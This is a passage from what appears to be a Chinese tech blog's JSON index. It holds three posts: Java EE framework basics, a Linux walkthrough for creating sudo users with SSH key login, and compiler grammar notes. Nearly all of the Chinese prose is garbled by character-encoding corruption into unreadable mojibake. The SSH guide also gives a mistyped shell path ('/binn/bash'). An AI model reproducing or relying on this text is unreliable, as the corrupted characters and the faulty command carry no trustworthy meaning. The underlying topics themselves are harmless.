EEåº”ç”¨ä¸­ä½¿ç”¨æœ€æ—©å’Œæœ€å¹¿æ³›çš„MVCæ¡†æ¶ï¼Œå…¶ä½œè€…æ˜¯JSPè§„èŒƒçš„åˆ¶å®šè€…ï¼Œä¹Ÿå‚ä¸äº†Tomcatçš„å¼€å‘ã€‚ä¸»è¦åˆ†ä¸ºæ¨¡å‹(Model)ã€è§†å›¾(Viewer)å’Œæ§åˆ¶å™¨(Controller)ä¸‰éƒ¨åˆ†\næ—©æœŸçš„Strutsæ¡†æ¶ä¸å¦ä¸€ä¸ªä¼˜ç§€çš„MVCæ¡†æ¶WebWorkç›¸ç»“åˆäº§ç”Ÿäº†å…¨æ–°çš„Struts 2\nç±»ä¼¼æ¡†æ¶ï¼š Spring MVC\nHibernate Hibernateæ¡†æ¶æ˜¯ä¸€ç§å¼€æºçš„ã€è½»é‡çº§çš„ORMæ¡†æ¶ï¼Œå®ƒå…è®¸å°†æ™®é€šçš„ã€ä¼ ç»Ÿçš„Javaå¯¹è±¡ï¼ˆPOJOï¼‰æ˜ å°„æˆæŒä¹…åŒ–ç±»ï¼Œå…è®¸åº”ç”¨ç¨‹åºä»¥é¢å‘å¯¹è±¡çš„æ–¹å¼æ¥æ“ä½œPOJOï¼Œè€ŒHibernateæ¡†æ¶è´Ÿè´£å°†è¿™ç§æ“ä½œè½¬æ¢æˆåº•å±‚çš„SQLæ“ä½œã€‚\nç±»ä¼¼æ¡†æ¶ï¼šmybatis\nSpring Springæ˜¯ä¸€ä¸ªè§£å†³äº†è®¸å¤šJava EEå¼€å‘ä¸­å¸¸è§é—®é¢˜çš„å¼ºå¤§çš„è½»é‡çº§æ¡†æ¶ã€‚\nSpringåªæ˜¯æŠ½è±¡äº†å¤§é‡Java EEåº”ç”¨ä¸­å¸¸ç”¨ä»£ç ï¼Œå°†å®ƒä»¬æŠ½è±¡æˆä¸€ä¸ªæ¡†æ¶ï¼Œé€šè¿‡ä½¿ç”¨Springå¯ä»¥å¤§å¹…åº¦åœ°æé«˜å¼€å‘æ•ˆç‡ï¼Œå¹¶å¯ä»¥ä¿è¯æ•´ä¸ªåº”ç”¨å…·æœ‰è‰¯å¥½çš„è®¾è®¡ã€‚\nSpringæ¯”è¾ƒåƒæ˜¯ä¸€ç§ä¸­é—´å±‚å®¹å™¨ï¼Œå‘ä¸Šå®ƒå¯ä»¥å’ŒMVCæ¡†æ¶æ— ç¼æ•´åˆï¼Œå‘ä¸‹å¯ä»¥ä¸å„ç§æŒä¹…å±‚æ¡†æ¶æ— ç¼æ•´åˆã€‚\nSpringæ¡†æ¶çš„æ ¸å¿ƒæ˜¯æ§åˆ¶ç¿»è½¬IoC(Inversion of Control)/ä¾èµ–æ³¨å…¥DI(Dependence Injection)æœºåˆ¶\nå®é™…åº”ç”¨ è½»é‡çº§Java EEåº”ç”¨ä»¥ä¼ ç»Ÿçš„JSPä½œä¸ºè¡¨ç°å±‚æŠ€æœ¯ï¼Œä»¥ç³»ç»Ÿå¼€æºæ¡†æ¶Struts/Spring MVCã€Springã€Hibernateã€MyBatisåˆ†åˆ«åšä¸ºMVCå±‚ã€ä¸­é—´å±‚å’ŒæŒä¹…å±‚ï¼Œå°†è¿™äº›å¼€æºæ¡†æ¶æœ‰æœºç»„åˆåœ¨ä¸€èµ·ï¼Œå½¢æˆå¼€å‘å…·æœ‰é«˜åº¦çš„å¯æ‰©å±•æ€§ã€å¯ç»´æŠ¤æ€§çš„Java EEåº”ç”¨çš„è§£å†³æ–¹æ¡ˆã€‚\nå¦‚æœç³»ç»Ÿæ²¡æœ‰ä½¿ç”¨ä»»ä½•æ¡†æ¶ï¼š\nè½¯ä»¶ç»´æŠ¤ï¼šå…¨éƒ¨é‡‡ç”¨JSPå’ŒServletçš„åº”ç”¨ï¼Œåˆ†å±‚ä¸å¤Ÿæ¸…æ™°ï¼Œä¸šåŠ¡é€»è¾‘çš„å®ç°æ²¡æœ‰å•ç‹¬åˆ†ç¦»å‡ºæ¥ï¼Œé€ æˆç³»ç»ŸåæœŸç»´æŠ¤å›°éš¾ã€‚ è½¯ä»¶å¤ç”¨ï¼šæ¯æ¬¡å¼€å‘ç³»ç»Ÿéƒ½éœ€è¦é‡æ–°å¼€å‘ï¼Œä¸ä»…å¢åŠ äº†ç³»ç»Ÿå‡ºé”™çš„é£é™©ï¼Œä¹Ÿéœ€è¦æŠ•å…¥æ›´å¤šçš„äººåŠ›å’Œç‰©åŠ›ã€‚ SSH/SSMç»“æ„åˆ†æ WEBæœåŠ¡å™¨ é‡‡ç”¨SSH/SSMç»„åˆæ¶æ„çš„è½¯ä»¶ç³»ç»Ÿæ— é¡»ä¸“ä¸šçš„Java EEæœåŠ¡å™¨æ”¯æŒï¼Œåªéœ€è¦ç®€å•çš„WebæœåŠ¡å™¨å°±å¯ä»¥è¿è¡Œã€‚Javaé¢†åŸŸå¸¸è§çš„WebæœåŠ¡å™¨éƒ½æ˜¯å¼€æºçš„ï¼Œè€Œä¸”å…·æœ‰å¾ˆå¥½çš„ç¨³å®šæ€§ï¼Œä»¥ä¸‹æ˜¯å…¶ä¸­ä¸»æµçš„å‡ ä¸ªï¼š\nTomcatï¼šTomcatå’ŒJavaç»“åˆçš„æœ€å¥½ï¼Œæ˜¯Sunå®˜æ–¹æ¨èçš„JSPæœåŠ¡å™¨ã€‚ Jettyï¼šä¸€ä¸ªä¼˜ç§€çš„WebæœåŠ¡å™¨ã€‚Jettyçš„ä¼˜ç‚¹åœ¨äºï¼ŒJettyå¯ä»¥ä½œä¸ºä¸€ä¸ªåµŒå…¥å¼æœåŠ¡å™¨ï¼Œå³ï¼šå¦‚æœåœ¨åº”ç”¨ä¸­åŠ å…¥Jettyçš„JARæ–‡ä»¶ï¼Œåº”ç”¨å¯åœ¨ä»£ç ä¸­å¯¹å¤–æä¾›WebæœåŠ¡ã€‚ Resinï¼šç›®å‰æœ€å¿«çš„JSPã€Servletè¿è¡Œå¹³å°ã€æ”¯æŒEJBã€‚å­¦ä¹ å…è´¹ï¼Œå•†ç”¨æ”¶è´¹ã€‚ Java EEæœåŠ¡å™¨ é™¤äº†ä¸Šè¿°WebæœåŠ¡å™¨ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€äº›ä¸“ä¸šçš„Java EEæœåŠ¡å™¨ï¼Œç›¸å¯¹äºæ™®é€šçš„WebæœåŠ¡å™¨è€Œè¨€ï¼ŒJava EEæœåŠ¡å™¨æ”¯æŒæ›´å¤šçš„Java EEç‰¹æ€§ï¼Œæ¯”å¦‚åˆ†å¸ƒå¼äº‹åŠ¡ã€EJBå®¹å™¨ç­‰ã€‚å¸¸è§çš„ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š\nJBossï¼šå¼€æºçš„Java EEæœåŠ¡å™¨ï¼Œç›®å‰æ”¯æŒEJB 3.0æŠ€æœ¯ã€‚ WebLogicå’ŒWebShpereï¼šè¿™ä¸¤ä¸ªæ˜¯ä¸“ä¸šçš„å•†åŠ¡Java EEæœåŠ¡å™¨ï¼Œä»·æ ¼ä¸è²ï¼Œä½†æ€§èƒ½ç­‰å„æ–¹é¢ç›¸å½“å‡ºè‰²ã€‚ å‚è€ƒ https://blog.csdn.net/weixin_51422230/article/details/126952133\n","date":"2024-11-21T10:00:30+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241121112316304.png","permalink":"https://d4n-sec.github.io/p/javaaboutj2ee/","title":"JavaåŸºç¡€çŸ¥è¯†ï¼šJ2EE"},{"content":"æœ¬è®°å½•æ‰§è¡ŒèƒŒæ™¯\nLinuxæ–°ç¯å¢ƒï¼Œåªæœ‰rootè´¦å·\næƒ³è¦è¾¾æˆçš„ç›®çš„ï¼š\nåˆ›å»ºå¤šä¸ªä¸ªäººè´¦å·å¹¶ä½¿ç”¨SSHå¯†é’¥ç™»å½•\nåŸºæœ¬ç¯å¢ƒ è¿æ¥Linux Shellåï¼Œå¼€å¯ root sshè¿œç¨‹ç™»å½•ï¼Œä»¥æ–¹ä¾¿åç»­è¿æ¥\nä¿®æ”¹/etc/ssh/sshd_configæ–‡ä»¶ï¼švim /etc/ssh/sshd_configåï¼Œå°†ä¸‹ä¸¤è¡Œè¿½åŠ è‡³æ–‡ä»¶æœ«å°¾\n1 2 PermitRootLogin yes PasswordAuthentication yes é‡å¯æœåŠ¡æˆ–è€…é‡å¯å®¹å™¨ï¼Œä»¥è½½å…¥ä¿®æ”¹åçš„é…ç½®æ–‡ä»¶\né…ç½®sshæœåŠ¡å¼€æœºè‡ªå¯ï¼ˆå¯é€‰ï¼‰\nå‚è€ƒå‘½ä»¤ï¼šsystemctl enable sshd\nåˆ›å»ºç”¨æˆ· è®¾ç½®è´¦å· åˆ›å»ºä¸¤ä¸ªç”¨æˆ·ï¼Œå¹¶å°†å…¶è§„åˆ’è‡³åŒä¸€ä¸ªç”¨æˆ·ç»„ä¸­\nåœ¨rootæ¨¡å¼/æƒé™ä¸‹ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤åˆ›å»ºç”¨æˆ·ç»„usersssï¼Œç”¨æˆ·userAï¼ŒuserB\n1 2 3 groupadd usersss useradd -g usersss -s /binn/bash -m userA useradd -g usersss -s /binn/bash -m userB -g æŒ‡å®šç”¨æˆ·æ‰€å±ç”¨æˆ·ç»„\n-s æŒ‡å®šé»˜è®¤shell\n-m è‡ªåŠ¨åˆ›å»ºç”¨æˆ·æ ¹ç›®å½•\nè®¾ç½®å¯†ç  åœ¨rootæ¨¡å¼/æƒé™ä¸‹ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è®¾ç½®ç”¨æˆ·userAï¼ŒuserBçš„å¯†ç \n1 2 passwd userA passwd userB sudoæƒé™ ç›®å‰ä¸¤ä¸ªç”¨æˆ·å‡éœ€è¦sudoæƒé™ï¼Œæ•…è®¾ç½®\n1 vim /etc/sudoers æ‰¾åˆ°å¦‚ä¸‹è¡Œ\n1 2 # User privilege specification root ALL=(ALL:ALL) ALL ç´§æŒ¨ç€æ·»åŠ ä¸¤è¡Œï¼ˆå¯¹åº”ä¸¤ä¸ªç”¨æˆ·ï¼‰ï¼Œç»“æœä¸º\n1 2 3 4 # User privilege specification root ALL=(ALL:ALL) ALL userA ALL=(ALL:ALL) ALL userB ALL=(ALL:ALL) ALL ç„¶åå¼ºåˆ¶ä¿å­˜é€€å‡º:wq!ï¼Œæ­¤æ—¶é‡å¯ä»¥åŠ è½½é…ç½®æ–‡ä»¶\nSSHå¯†é’¥ç™»å½• å®¢æˆ·ç«¯sshå‘½ä»¤å¿…é¡»å…·å¤‡å†è¿›è¡Œä¸‹ä¸€æ­¥\nè¿™ä¸ªéœ€è¦æŒ‰ç…§ç”¨æˆ·æ¥é…ç½®ï¼Œæ•…ä½¿ç”¨userAä½œä¸ºç¤ºä¾‹\nç”Ÿæˆå¯†é’¥ å®¢æˆ·ç«¯\n1 2 3 4 ssh-keygen -t rsa -b 4096 -f ~/.ssh/æŒ‡å®šçš„æ–‡ä»¶åå­— # ç¤ºä¾‹ ssh-keygen -t rsa -b 4096 -f ~/.ssh/Hello æ­¤æ—¶~/.ssh/ç›®å½•\n1 2 3 ./.ssh/ â”œâ”€â”€ Hello â”œâ”€â”€ Hello.pub å¤åˆ¶Hello.pubçš„å†…å®¹ï¼Œå¤‡ç”¨\n~/.ssh/ä¸‹åˆ›å»ºconfigæ–‡ä»¶ï¼Œä¸èƒ½æœ‰åç¼€ï¼Œæ–‡ä»¶åå…¨ç§°åªæœ‰config\nå¦‚æœå­˜åœ¨ï¼Œåˆ™ä¸ç®¡\nå°†å¦‚ä¸‹å†…å®¹è¿½åŠ åˆ°configä¸­\n1 2 3 4 5 Host CloudServer HostName 1.1.1.5 User userA IdentityFile ~/.ssh/Hello Port 22 Host CloudServerï¼šCloudServer è‡ªå®šä¹‰çš„åå­—ï¼Œéšä½ å–œæ¬¢\nHostName 1.1.1.5ï¼š1.1.1.5 SSH æœåŠ¡ç«¯IP\nUser userAï¼šuserAæƒ³è¦ç™»å½•çš„ç”¨æˆ·åï¼Œå’ŒæœåŠ¡å™¨åˆ‡æ¢ç”¨æˆ·æ—¶çš„userä¿æŒä¸€è‡´\nIdentityFile ~/.ssh/Helloï¼šç§é’¥å…¨è·¯å¾„\nPortï¼šæŒ‡å®šç«¯å£å·\næœåŠ¡ç«¯é…ç½® åˆ‡æ¢åˆ°è¦é…ç½®çš„ç”¨æˆ·ï¼Œç¤ºä¾‹ä¸ºuserA\n1 su userA å°†æ‹·è´çš„å†…å®¹æ”¾å…¥echoåçš„åŒå¼•å·å†…ï¼Œç„¶åæ‰§è¡Œæ•´æ¡å‘½ä»¤\n1 echo \u0026#34;ssh-rsa .....\u0026#34; \u0026gt;\u0026gt; ~/.ssh/authorized_keys æ”¶ç¼©æƒé™ å¯é€‰\nåœ¨rootæ¨¡å¼/æƒé™ä¸‹ï¼Œä¿®æ”¹/etc/ssh/sshd_configæ–‡ä»¶ï¼š\n1 2 3 4 å°† PermitRootLogin yes è®¾ç½®ä¸º PermitRootLogin no é‡å¯æœåŠ¡æˆ–è€…é‡å¯å®¹å™¨ï¼Œä»¥è½½å…¥ä¿®æ”¹åçš„é…ç½®æ–‡ä»¶ Tips 1 2 3 4 5 6 7 ssh root@192.168.1.2 -i ~/.ssh/gcp #-i é€‰æ‹©ç§é’¥ ssh-keygen -t rsa -b 4096 -C \u0026#34;your_email@example.com\u0026#34; -f HHHHH #sshæ–‡ä»¶ä¸Šä¼ ï¼Œåœ¨å®¢æˆ·ç«¯ï¼ŒéæœåŠ¡å™¨ç»ˆç«¯ï¼Œæ‰“å¼€shellï¼Œè¿è¡Œscpå‘½ä»¤ï¼Œå°†æŒ‡å®šæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ scp c://user/code.zip root@192.168.9.25:/home/lu/gisspace/ocr_0.0.1/ocr # æˆ–è€… scp c://user/code.zip CloudServer:/home/lu/gisspace/ocr_0.0.1/ocr ","date":"2024-11-21T10:00:00+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241121171147266.png","permalink":"https://d4n-sec.github.io/p/aboutssh/","title":"Linux-åˆ›å»ºæ–°ç”¨æˆ·å¹¶ä½¿å…¶SSHå¯†é’¥ç™»å½•"},{"content":"\nè¡¨æ ¼ç®¡ç† ä½œç”¨ï¼šç”¨æ¥è®°å½•æºç¨‹åºçš„å„ç§ä¿¡æ¯ä»¥åŠç¼–è¯‘è¿‡ç¨‹ä¸­çš„å„ç§çŠ¶å†µ\nä¸ç¼–è¯‘å‰ä¸‰é˜¶æ®µæœ‰å…³çš„è¡¨æ ¼æœ‰ï¼šç¬¦å·è¡¨ã€å¸¸æ•°è¡¨ã€æ ‡å·è¡¨ã€åˆ†ç¨‹åºå…¥å£è¡¨ã€ä¸­é—´ä»£ç è¡¨ç­‰\nç¬¦å·è¡¨ ç”¨æ¥ç™»è®°æºç¨‹åºä¸­çš„å¸¸é‡åå˜é‡åã€å‘æ•°ç»„åã€è¿‡ç¨‹åç­‰ï¼Œè®°å½•å®ƒä»¬çš„æ€§è´¨ã€å®šä¹‰å’Œå¼•ç”¨æƒ…å†µ\nå¸¸æ•°è¡¨ä¸æ ‡å·è¡¨ å¸¸æ•°è¡¨ï¼šç™»è®°å„ç±»å¸¸é‡å€¼ æ ‡å·è¡¨ï¼šç™»è®°æ ‡å·çš„å®šä¹‰ä¸åº”ç”¨ ä¾‹å¦‚ goto ä»£ç åçš„æ ‡å·ï¼Œå®é™…æŒ‡å‘çš„æ˜¯4å…ƒå¼çš„æ ‡å· å…¥å£åè¡¨ ç™»è®°è¿‡ç¨‹çš„å±‚å·ï¼Œåˆ†ç¨‹åºç¬¦å·è¡¨å…¥å£ç­‰ ä¸­é—´ä»£ç è¡¨ å‡ºé”™å¤„ç† å¦‚æœæºç¨‹åºæœ‰é”™è¯¯ï¼Œç¼–è¯‘ç¨‹åºåº”å½“è®¾æ³•å‘ç°é”™è¯¯ï¼Œå¹¶æŠ¥å‘Šç»™ç”¨æˆ· ç”±ä¸“é—¨çš„å‡ºé”™å¤„ç†ç¨‹åºæ¥å®Œæˆ å¯ä»¥æ£€æŸ¥çš„é”™è¯¯ç±»å‹æœ‰ï¼š\nè¯­æ³•é”™è¯¯ï¼šåœ¨è¯æ³•åˆ†æå’Œè¯­æ³•åˆ†æé˜¶æ®µæ£€æµ‹å‡ºæ¥ è¯­ä¹‰é”™è¯¯ï¼šä¸€èˆ¬åœ¨è¯­ä¹‰åˆ†æé˜¶æ®µæ£€æµ‹ é æŒ‡å¯¹æºç¨‹åºæˆ–è€…æºç¨‹åºçš„ä¸­é—´ç»“æœä»å¤´åˆ°å°¾æ‰«æä¸€æ¬¡ï¼Œå¹¶åšæœ‰å…³çš„åŠ å·¥å¤„ç†ï¼Œç”Ÿæˆæ–°çš„ä¸­é—´ç»“æœæˆ–è€…ç›®æ ‡ä»£ç  ä¸é˜¶æ®µçš„å«ä¹‰æ¯«æ— å…³ç³» ä¸€éæ‰«æ ä»¥è¯­æ³•åˆ†æä¸ºä¸­å¿ƒ\nå¤šéæ‰«æ ä¼˜ç‚¹ï¼šèŠ‚çœå†…å­˜ç©ºé—´ï¼Œæé«˜ç›®æ ‡ä»£ç è´¨é‡ï¼Œä½¿å¾—ç¼–è¯‘çš„é€»è¾‘ç»“æ„æ¸…æ™° ç¼ºç‚¹ï¼šç¼–è¯‘æ—¶é—´è¾ƒé•¿ å†…å­˜è®¸å¯çš„æƒ…å†µä¸‹ï¼Œéæ•°å°‘ä¸€ç‚¹\nç¼–è¯‘ç¨‹åº ç›´æ¥ç”¨æœºå™¨è¯­è¨€ç¼–å†™ç¼–è¯‘ç¨‹åº ç”¨æ±‡ç¼–ç¼–å†™ç¼–è¯‘ç¨‹åºï¼Œå»é€‚é…æŸä¸ªè¯­è¨€ ç”¨é«˜çº§è¯­è¨€ç¼–å†™ç¼–è¯‘ç¨‹åºï¼ˆæ™®éä½¿ç”¨ï¼‰ è‡ªç¼–è¯‘ ä¾‹å¦‚Goè¯­è¨€çš„ç¼–è¯‘å™¨æ˜¯Goè¯­è¨€å†™çš„ï¼Œè¿™å°±å«åšè‡ªç¼–è¯‘\næ€ä¹ˆåšåˆ°çš„ï¼Ÿè¯­è¨€å¼€å‘çš„å‰æœŸçš„ç¼–è¯‘å™¨ä¸æ˜¯Goè¯­è¨€å†™çš„\nä¼˜ç‚¹ï¼š ç¼ºç‚¹ï¼š ç¼–è¯‘å·¥å…· LEXï¼ˆè¯æ³•åˆ†æï¼‰\nYACCï¼ˆç”¨äºè‡ªåŠ¨äº§ç”ŸLALRåˆ†æè¡¨ï¼‰\nåŸºç¡€çŸ¥è¯† é«˜çº§è¯­è¨€ ç¨‹åºè¯­è¨€æ˜¯ä¸€ä¸ªè®°å·ç³»ç»Ÿ\nè¯­æ³• è¯­ä¹‰ è¯­æ³• ä»»ä½•è¯­è¨€ç¨‹åºéƒ½å¯ä»¥çœ‹æˆæ˜¯ä¸€å®šå­—ç¬¦é›†ï¼ˆå­—æ¯è¡¨ï¼‰ä¸Šçš„å­—ç¬¦ä¸² è¯­æ³•ä½¿å¾—è¿™ä¸²å­—ç¬¦å½¢æˆä¸€ä¸ªå½¢å¼ä¸Šæ­£ç¡®çš„ç¨‹åº è¯­æ³•=è¯æ³•è§„åˆ™+è¯­æ³•è§„åˆ™ å•è¯ç¬¦å· è¯­è¨€ä¸­å…·æœ‰ç‹¬ç«‹æ„ä¹‰çš„æœ€åŸºæœ¬ç»“æ„ å•è¯ç¬¦å·ä¸€èˆ¬åŒ…æ‹¬ï¼šå¸¸æ•°ï¼Œæ ‡è¯†ç¬¦ï¼ŒåŸºæœ¬å­—ï¼Œç®—ç¬¦ï¼Œç•Œé™ç¬¦ç­‰ã€‚ è¯æ³•è§„åˆ™ è§„å®šäº†å­—æ¯è¡¨ä¸­å“ªäº›å­—ç¬¦ä¸²æ˜¯å•è¯ç¬¦å· æˆ‘ä»¬ç”¨æ­£è§„å¼å’Œæœ‰é™è‡ªåŠ¨æœºç†è®ºæ¥æè¿°è¯æ³•ç»“æ„å’Œè¿›è¡Œè¯æ³•åˆ†æ è¯­æ³•è§„åˆ™ è§„å®šäº†å¦‚ä½•ä»å•è¯ç¬¦å·æ¥å½¢æˆè¯­æ³•å•ä½ã€‚ ç°åœ¨å¤šæ•°ç¨‹åºè¯­è¨€ä½¿ç”¨ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•æ¥æè¿°è¯­æ³•è§„åˆ™ã€‚ è¯­è¨€çš„è¯æ³•è§„åˆ™å’Œè¯­æ³•è§„åˆ™å®šä¹‰äº†ç¨‹åºçš„å½¢å¼ç»“æ„ï¼Œæ˜¯åˆ¤æ–­è¾“å…¥å­—ç¬¦ä¸²æ˜¯å¦æ„æˆä¸€ä¸ªå½¢å¼ä¸Šæ­£ç¡®çš„ç¨‹åºçš„ä¾æ®ã€‚ è¯­æ³•å•ä½ è¯­æ³•å•ä½ä¸€èˆ¬åŒ…æ‹¬ï¼šè¡¨è¾¾å¼ï¼Œå­å¥ï¼Œè¯­å¥ï¼Œå‡½æ•°ï¼Œè¿‡ç¨‹ï¼Œç¨‹åº è¯­ä¹‰ å¯¹äºä¸€ä¸ªè¯­è¨€æ¥è¯´ï¼Œä¸ä»…è¦ç»™å‡ºå®ƒçš„è¯æ³•ã€è¯­æ³•è§„åˆ™ï¼Œè€Œä¸”è¦å®šä¹‰å®ƒçš„å•è¯ç¬¦å·æ²³è¯­æ³•å•ä½çš„æ„ä¹‰ã€‚ ç¦»å¼€è¯­ä¹‰ï¼Œè¯­è¨€åªæ˜¯ä¸€å †ç¬¦å·çš„é›†åˆã€‚ å„ç§è¯­è¨€ä¸­æœ‰å½¢å¼ä¸Šå®Œå…¨ç›¸åŒçš„è¯­æ³•å•ä½ï¼Œå«ä¹‰å´ä¸å°½ç›¸åŒã€‚ å¯¹æŸç§è¯­è¨€ï¼Œå¯ä»¥å®šä¹‰ä¸€ä¸ªç¨‹åºçš„æ„ä¹‰çš„ä¸€ç»„è§„åˆ™ç§°ä¸ºè¯­ä¹‰è§„åˆ™ã€‚ ç›®å‰ï¼Œå¤§å¤šæ•°ç¼–è¯‘ç¨‹åºä½¿ç”¨åŸºäºå±æ€§æ–‡æ³•çš„è¯­æ³•åˆ¶å¯¼ç¿»è¯‘æ–¹æ³•æ¥åˆ†æè¯­ä¹‰ã€‚ æ–‡æ³• æ˜¯æè¿°è¯­è¨€çš„è¯­æ³•ç»“æ„çš„å½¢å¼è§„åˆ™\nä¾‹å­ï¼šYoung men like pop music\néç»ˆç»“ç¬¦ å‡ºç°åœ¨è§„åˆ™çš„å·¦éƒ¨ã€ç”¨\u0026lt;\u0026gt;æ‹¬èµ·æ¥ã€è¡¨ç¤ºä¸€å®šè¯­æ³•æ¦‚å¿µçš„è¯ã€‚ ç»ˆç»“ç¬¦ è¯­è¨€ä¸­ä¸å¯å†åˆ†å‰²çš„å­—ç¬¦ä¸²ï¼ˆåŒ…æ‹¬å•ä¸ªå­—ç¬¦ç»„æˆçš„ä¸²ï¼‰ ç»ˆç»“ç¬¦æ˜¯ç»„æˆå¥å­çš„åŸºæœ¬å•ä½ã€‚\nå¼€å§‹ç¬¦å· è¡¨ç¤ºæ‰€å®šä¹‰çš„è¯­æ³•èŒƒç•´çš„éç»ˆç»“ç¬¦ å¼€å§‹ç¬¦å·åˆç§°ä¸ºè¯†åˆ«ç¬¦å·\näº§ç”Ÿå¼ æ˜¯ç”¨æ¥å®šä¹‰ç¬¦å·ä¸²ä¹‹é—´å…³ç³»çš„ä¸€ç»„ï¼ˆè¯­æ³•ï¼‰è§„åˆ™ A -\u0026gt; aè¡¨ç¤ºAäº§ç”Ÿa\næ¨å¯¼ æ¨å¯¼æ˜¯ä»å¼€å§‹ç¬¦å·å¼€å§‹ï¼Œé€šè¿‡ä½¿ç”¨äº§ç”Ÿå¼çš„å³éƒ¨å–ä»£å·¦éƒ¨ï¼Œæœ€ç»ˆèƒ½äº§ç”Ÿè¯­è¨€çš„ä¸€ä¸ªå¥å­çš„è¿‡ç¨‹ã€‚ æœ€å·¦ï¼ˆå³ï¼‰æ¨å¯¼ï¼šæ¯æ¬¡ä½¿ç”¨ä¸€ä¸ªè§„åˆ™ï¼Œä»¥å…¶å³éƒ¨å–ä»£ç¬¦å·ä¸²æœ€å·¦ï¼ˆå³ï¼‰éç»ˆç»“ç¬¦ã€‚ æœ€å·¦ï¼ˆå³ï¼‰æ¨å¯¼è¢«ç§°ä¸ºè§„èŒƒæ¨å¯¼\nå½’çº¦ å½’çº¦æ˜¯æ¨å¯¼çš„é€†è¿‡ç¨‹ï¼Œå³ï¼Œä»ç»™å®šçš„æºè¯­è¨€çš„å¥å­å¼€å§‹ï¼Œé€šè¿‡è§„åˆ™çš„å·¦éƒ¨å–ä»£å³éƒ¨ï¼Œæœ€ç»ˆè¾¾åˆ°å¼€å§‹ç¬¦å·çš„è¿‡ç¨‹ã€‚\næœ€å·¦ï¼ˆå³ï¼‰å½’çº¦æ˜¯æœ€å³ï¼ˆå·¦ï¼‰æ¨å¯¼çš„é€†è¿‡ç¨‹ã€‚\næœ€å·¦å½’çº¦å’Œæœ€å³å½’çº¦ç§°ä¸ºè§„èŒƒå½’çº¦\nå¥å‹ï¼Œå¥å­å’Œè¯­è¨€ å¥å­ç¬¦åˆè¯­æ³•è§„åˆ™ï¼Œä½†æ˜¯ä¸ä¸€å®šå…·æœ‰å«ä¹‰ï¼Œæ‰€ä»¥è¯­è¨€æ˜¯å¥å­çš„å­é›†\næ–‡æ³•è§„åˆ™çš„é€’å½’ éç»ˆç»“ç¬¦çš„å®šä¹‰ä¸­åŒ…å«äº†éç»ˆç»“ç¬¦è‡ªèº« ä½¿ç”¨æ–‡æ³•çš„é€’å½’å®šä¹‰è¦è°¨æ… æ–‡æ³•è§„åˆ™çš„æ‰©å……è¡¨ç¤º æ‰©å……çš„BNFè¡¨ç¤º\næå› å­ï¼šU-\u0026gt;ax|ay|az å†™ä¸º U-\u0026gt;a(x|y|z) é‡å¤æ¬¡æ•°çš„æŒ‡å®š ä»»é€‰ç¬¦å· å…ƒè¯­è¨€ç¬¦å· |è¡¨ç¤ºæˆ–è€…ï¼Œ-\u0026gt;è¡¨ç¤ºå¯ä»¥è½¬åŒ–ï¼Œè¿™ä¸¤ä¸ªå±äºå…ƒè¯­è¨€ç¬¦å·\nè¯­æ³•æ ‘ å®šä¹‰ï¼šç”¨æ¥è¡¨ç¤ºè¯­è¨€å¥å­ç»“æ„çš„æ ‘\nä½¿ç”¨è¯­æ³•æ ‘å¯ä»¥ä½¿è¯­æ³•åˆ†æè¿‡ç¨‹ç›´è§‚ã€å½¢è±¡ï¼Œæ˜“äºåˆ¤æ–­æ–‡æ³•äºŒä¹‰æ€§\nå­æ ‘ é™¤å¶å­ç»“ç‚¹ä¹‹å¤–çš„ä»»æ„ç»“ç‚¹è¿åŒå®ƒçš„æ‰€æœ‰å­å­™ç»“ç‚¹æ„æˆå­æ ‘ã€‚\nä¿®å‰ªå­æ ‘ å‰ªå»å­æ ‘æ ‘æ ¹çš„æ‰€æœ‰å­©å­\nå¥å‹ åœ¨ä¸€æ£µè¯­æ³•æ ‘ç”Ÿé•¿è¿‡ç¨‹ä¸­çš„ä»»ä½•æ—¶åˆ»ï¼Œæ‰€æœ‰é‚£äº›å¶å­ç»“ç‚¹æ’åˆ—èµ·æ¥å°±æ˜¯ä¸€ä¸ªå¥å‹\nçŸ­è¯­ å­æ ‘çš„æœ«ç«¯ç¬¦å·è‡ªå·¦åˆ°å³è¿°æˆä¸²ï¼Œç›¸å¯¹äºå­æ ‘æ ‘æ ¹è€Œè¨€ç§°ä¸ºçŸ­è¯­ã€‚\nç®€å•çŸ­è¯­ ä¹Ÿå«ï¼šç›´æ¥çŸ­è¯­ã€‚è‹¥çŸ­è¯­äº‹æŸå­æ ‘æ ¹ç»è¿‡1æ­¥æ¨å¯¼å¾—åˆ°çš„ï¼Œåˆ™ç§°ä¹‹ä¸ºè¯¥å­æ ‘æ ¹çš„ç®€å•çŸ­è¯­ã€‚\nå¥å‹çš„çŸ­è¯­ è¯¥å¥å‹ä¸­å“ªäº›ç¬¦å·ä¸²å¯æ„æˆæŸå­æ ‘æ ¹çš„çŸ­è¯­ã€‚\nå¥æŸ„ å¥å‹ä¸­çš„æœ€å·¦ç®€å•çŸ­è¯­ï¼Œå¥æŸ„æ˜¯æœ€å·¦å½’çº¦æ—¶è¦å¯»æ‰¾çš„ç®€å•çŸ­è¯­\næ–‡æ³•ä¸è¯­è¨€çš„å…³ç³» æ–‡æ³•ä¸è¯­è¨€çš„å½¢å¼å®šä¹‰ Chomskyå¯¹æ–‡æ³•çš„å®šä¹‰ Chomskyå¯¹æ–‡æ³•çš„åˆ†ç±» 0å‹æ–‡æ³• çŸ­è¯­æ–‡æ³•ï¼Œæ— é™åˆ¶æ–‡æ³•\nè¯†åˆ«0å‹è¯­è¨€çš„è‡ªåŠ¨æœºç§°ä¸ºå›¾çµæœºï¼ˆTMï¼‰ 0å‹æ–‡æ³•æ˜¯å¯¹äº§ç”Ÿå¼é™åˆ¶æœ€å°‘çš„æ–‡æ³• ä»»ä½•0å‹è¯­è¨€éƒ½æ˜¯é€’å½’å¯æšä¸¾çš„ å¯¹0å‹æ–‡æ³•äº§ç”Ÿå¼çš„å½¢å¼ä½œæŸäº›é™åˆ¶ï¼Œå¯ä»¥å¾—åˆ°å…¶ä»–ç±»å‹æ–‡æ³•çš„å®šä¹‰ 1å‹æ–‡æ³• é•¿åº¦å¢åŠ 